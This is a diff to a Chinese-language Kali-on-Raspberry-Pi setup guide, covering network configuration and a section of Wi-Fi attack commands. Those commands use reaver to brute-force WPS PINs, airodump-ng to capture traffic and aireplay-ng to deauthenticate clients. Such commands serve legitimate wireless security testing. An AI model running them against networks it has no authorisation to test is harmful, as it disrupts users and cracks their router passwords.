@@ -93,7 +93,7 @@ resize2fs /dev/mmcblk0p2
 
 ##### **注意**
 
-`arp -a` 后 `192.168.137.1` 下面不一定非是动态的才是树莓派上 Kali 获得的 IP，静态的也有可能
+`arp -a` 后 `192.168.137.1` 下面不一定非是动态的才是树莓派上 Kali 获得的 IP，静态的也有可能。而且根据我的经验，如果是共享无线网卡的网络给有线网卡然后和树莓派直接网线相连，就是静态 IP，而如果只是在有线网卡上配置网关而不采用共享无线网卡的网络，就是动态 IP。
 
 还有，使用上面获得的 IP 登录到树莓派之后，网络不一定会通，因为在 /etc/resolv.conf 这个配置文件中的 `nameserver` 是笔记本有线网卡的 IP 地址，而这显然是不管用的，所有需要在改配置文件中手动添加 DNS 服务器地址或者在笔记本上有线接口 IPV4 属性配置中添加可用的 DNS 服务器地址，比如：
 
@@ -120,7 +120,7 @@ apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y
 修改 /etc/network/interfaces 文件：
 
 ```
-sudo vim /etc/network/interfaces
+ vim /etc/network/interfaces
 ```
 
 修改后文件内容类似于如下：
@@ -252,19 +252,20 @@ wifite
 - **使用 reaver 破解开启 wps 功能的路由器密码**
 
 ```
-reaver  -i  mon0  -b 8C:21:0A:5F:A2:FA  -a  -S  -vv  -d2  -t 5 -c 1
-airmon-ng start wlan0
-airodump-ng mon0
+reaver -i wlan0mon -b BSSID_MAC  -a  -S  -vv  -d2  -t 5 -c 1
+# reaver -i wlan0mon -b BSSID_MAC -vv -c 6 -p 88948935
 ```
 
 Aircrack-ng
 -
 
 ```
-sudo airmon-ng start wlan0
-sudo airodump-ng wlan0mon
+airmon-ng start wlan0
+airodump-ng wlan0mon
 airmon-ng start wifi0 9
-reaver -i mon0 -b F8:D1:11:31:50:24 -vv -c 6 -p 88948935
+airodump-ng wlan0mon
+airodump-ng -c 6 –w wpa-wps wlan0mon
+aireplay-ng -0 10 -a AP_MAC  -c CLIENT_MAC  wlan0mon
 ```
 
 - **搜索不到无线?**
@@ -274,18 +275,12 @@ reaver -i mon0 -b F8:D1:11:31:50:24 -vv -c 6 -p 88948935
 - **执行 `airmon-ng start wlan0` 提示错误，执行 `airodump wlan0mon`失败?**
 
 ```
-sudo apt-get install rfkill
+ apt-get install rfkill
 ```
 
 - Failed to associate with … …
 
 - Request occur timeout … …
-
-```
-airodump-ng -c 6 –w wpa-wps wlan0mon
-
-aireplay-ng -0 10 -a 50:BD:5F:0F:B9:BA -c BC:3A:EA:60:6C:61 wlan0mon
-```
 
 Screen 的使用
 -
